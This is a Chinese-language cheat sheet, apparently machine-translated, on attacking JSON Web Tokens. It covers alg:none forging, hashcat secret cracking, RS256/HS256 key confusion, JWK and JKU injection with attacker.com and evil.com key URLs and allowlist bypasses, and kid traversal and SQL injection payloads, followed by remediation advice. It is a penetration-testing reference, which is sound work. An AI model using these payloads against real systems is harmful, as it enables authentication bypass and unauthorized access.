<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎟️ JWT 攻击 - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT 攻击">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="关键攻击">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API 测试">
</p>

<p对齐=“中心”>
  <b>🛡️利用 JSON Web Token (JWT) 漏洞的全面方法和实用命令</b>
</p>

---

## 📋 目录

- [JWT 的介绍和剖析](#-introduction--anatomy-of-a-jwt)
- [基本测试工具](#-essential-testing-tools)
- [漏洞矩阵和攻击向量](#-vulnerability-matrix--attack-vectors)
  - [1.无算法缺陷 (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
  - [2.弱 HMAC 秘密破解 (HS256)](#2-weak-hmac-secret-cracking-hs256)
  - [3.算法混乱/密钥混乱(RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
  - [4. JWK（JSON Web 密钥）标头注入](#4-jwk-json-web-key-header-injection)
  - [5. JKU（JWK 设置 URL）配置错误和 SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [6. KID（密钥 ID）标头操作和注入](#6-kid-key-id-header-manipulation--injections)
  - [7.跨服务中继&敏感数据泄露](#7-cross-service-relaying--sensitive-data-leakage)
- [使用 `jwt_tool` 进行自动化测试](#-automating-tests-with-jwt_tool)
- [使用 Hashcat 破解 JWT 秘密](#-cracking-jwt-secrets-with-hashcat)
- [快速参考表](#-quick-reference-table)
- [修复和安全实施](#-remediation--secure-implementation)
- [法律免责声明](#-legal-disclaimer)
- [资源](#-资源)

---

## 🎯 JWT 的介绍和剖析

**JSON Web 令牌 (JWT)** 是一种紧凑、URL 安全的方式，用于表示两方之间的声明。通常用于现代 REST API、单页应用程序 (SPA) 和微服务中的会话身份验证。

标准 JWT 由三个由点分隔的 Base64URL 编码部分 (`.`) 组成：
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```
1. **标头：** 标识令牌类型和使用的加密算法（例如，`HS256`、`RS256`、`none`）。
2. **有效负载：** 包含声明（例如，`user_id`、`role`、过期 `exp`）。 *注意：有效负载是编码的，而不是加密的！*
3. **签名：** 通过使用秘密密钥或私钥对编码的标头和有效负载进行哈希处理而创建。

---

## 🛠️ 基本测试工具

1. **jwt_tool：** 用于分析、测试和破解 JWT 的命令行工具包。
2. **Hashcat：** 基于GPU的快速HMAC秘密破解（模式`16500`）。
3. **Burp Suite 扩展：** Fraser Winterborn 的“JWT 编辑器”（在 PortSwigger BApp Store 中）。

### 安装`jwt_tool`
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```
---

## 💥 漏洞矩阵和攻击向量

### 1. 无算法缺陷 (`alg: "none"`)

**机制：**
如果 `alg` 标头设置为 `none`，某些 JWT 验证库会认为令牌有效，从而完全绕过签名验证。

**利用：**
1、解码头部，将`"alg": "HS256"`改为`"alg": "none"`。
2. 修改有效负载声明（例如，`"role": "admin"`）。
3. 删除签名部分（保留尾随点！）。
```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```
*手动代币结构：*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```
---

### 2.弱HMAC秘密破解（HS256）

**机制：**
如果服务器使用对称算法（`HS256`、`HS384`、`HS512`）以及可猜测或弱密钥（例如，`secret`、`admin123`、公司名称）对令牌进行签名，则攻击者可以离线暴力破解秘密并签署任意令牌。

**用Hashcat破解：**
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```
**破解后锻造Token：**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```
---

### 3.算法混乱/密钥混乱（RS256 -> HS256）

**机制：**
- **RS256（非对称）：** 使用服务器的私钥签名；使用服务器的**公钥**进行验证。
- **HS256（对称）：** 使用**相同的共享密钥**进行签名和验证。

如果后端库没有严格强制算法类型，攻击者可以：
1. 获取服务器的公钥（通常在 `/.well-known/jwks.json` 或证书上公开）。
2. 将代币的算法头从 `RS256` 更改为 `HS256`。
3. 使用服务器的**公钥**作为 HMAC 密钥对修改后的令牌进行签名！
4. 服务器收到令牌，看到`HS256`，并使用其配置的验证密钥（即其公钥）验证签名，从而得到有效的签名！

**通过 `jwt_tool` 进行利用：**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```
---

### 4. JWK（JSON Web Key）标头注入

**机制：**
JWT 规范允许在 `jwk` 标头参数中嵌入公钥。易受攻击的服务器信任此标头密钥来验证签名，而不检查该密钥是否属于受信任的 CA 或预共享白名单。

**利用：**
1. 生成攻击者RSA密钥对。
2. 将公钥嵌入 `jwk` 标头中。
3. 使用您匹配的私钥对令牌进行签名。
```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```
---

### 5. JKU（JWK 设置 URL）配置错误和 SSRF

**机制：**
`jku`（JWK Set URL）标头指定服务器应从中获取公钥集以验证令牌的远程 URL。

**利用：**
1. 在攻击者 Web 服务器上托管您自己的 `jwks.json`：
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
2.修改token头：
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. 使用您的私钥对令牌进行签名。

> **绕过 URL 白名单：**
> 如果应用程序验证域名结尾，请测试开放重定向或 URL 解析怪癖：
> - `https://trusted.com@attacker.com/jwks.json`
> - `https://trusted.com.attacker.com/jwks.json`
> - 打开重定向：`https://trusted.com/redirect?url=http://attacker.com/jwks.json`

---

### 6. KID（密钥 ID）标头操作和注入

`kid` 标头是一个字符串，用于标识应从数据库或文件系统加载哪个密钥。

#### A. 目录遍历到空文件（`/dev/null`）
如果服务器使用`kid`从磁盘读取密钥文件：
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
使用空秘密（`""` / 0 字节）对令牌进行签名！

#### B. 通过 KID 进行 SQL 注入
如果服务器从数据库获取机密：
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
注入已知的静态字符串：
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
使用秘密 `'my_known_secret'` 签署令牌。

---

### 7. 跨服务中继和敏感数据泄露

- **未加密的 PII：** 开发人员经常在有效负载中存储密码、SSN 或敏感用户元数据，忘记它只是 Base64URL 编码，而不是加密。
- **服务混乱：** 针对内部管理 API 使用用于低权限服务（例如分析 API）的令牌。

---

## ⚡ 使用 `jwt_tool` 进行自动化测试

### 运行所有内置 Playbook 攻击
自动扫描所有已知漏洞的最简单方法：
```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```
### 交互篡改模式
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```
---

## 🔓 使用 Hashcat 破解 JWT 秘密
```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
---

## 📊 快速参考表

|漏洞|攻击技术|关键有效负载/标志|
|--------------|------------------|--------------------|
| **无算法** |设置 `alg: "none"`，剥离签名 | `jwt_tool <TOKEN> -X a` |
| **弱秘密** | GPU 字典暴力破解 | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **算法混乱**|将RS256改为HS256，用公钥签名 | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **JWK注射液** |在标头中嵌入攻击者公钥 | `jwt_tool <TOKEN> -X i` |
| **JKU注射** |将`jku`指向外部服务器 | `"jku": "http://evil.com/jwks.json"` |
| **KID路径遍历**|将 `kid` 指向 `/dev/null` 或已知文件 | `"kid": "/dev/null"`（用`""`签名）|
| **KID SQLi** |将静态秘密注入 SQL 查询 | `"kid": "' UNION SELECT 'secret'-- -"`|

---

## 🛡️ 修复和安全实施

1. **明确的白名单算法：**
   切勿允许客户端控制的 `alg` 选择。在服务器上硬编码允许的算法（例如，专门允许 `RS256`）。
2. **拒绝`alg: none`代币：**
   确保库严格拒绝未经验证或未签名的令牌。
3. **使用长的、加密安全的秘密：**
   HMAC 密钥必须至少为 256 位（32+ 随机字符），由安全 CSPRNG 生成。
4. **验证 `jku` 和 `jwk` 标头：**
   仅从内部受信任 URL 的严格白名单中获取 JWK 集；拒绝用户提供的外部域。
5. **清理 `kid` 值：**
   将`kid`视为不受信任的用户输入；清理目录遍历 (`../`) 和 SQL 注入。

---

## ⚠️ 法律免责声明

> **重要：** JWT 攻击可能导致完全身份验证绕过和对应用程序数据库的未经授权的访问。本指南严格用于教育目的和授权渗透测试。

---

## 📚 资源

- [jwt_tool GitHub 存储库](https://github.com/ticarpi/jwt_tool)
- [PortSwigger Web 安全学院：JWT 攻击](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web 令牌 (JWT) 标准](https://datatracker.ietf.org/doc/html/rfc7519)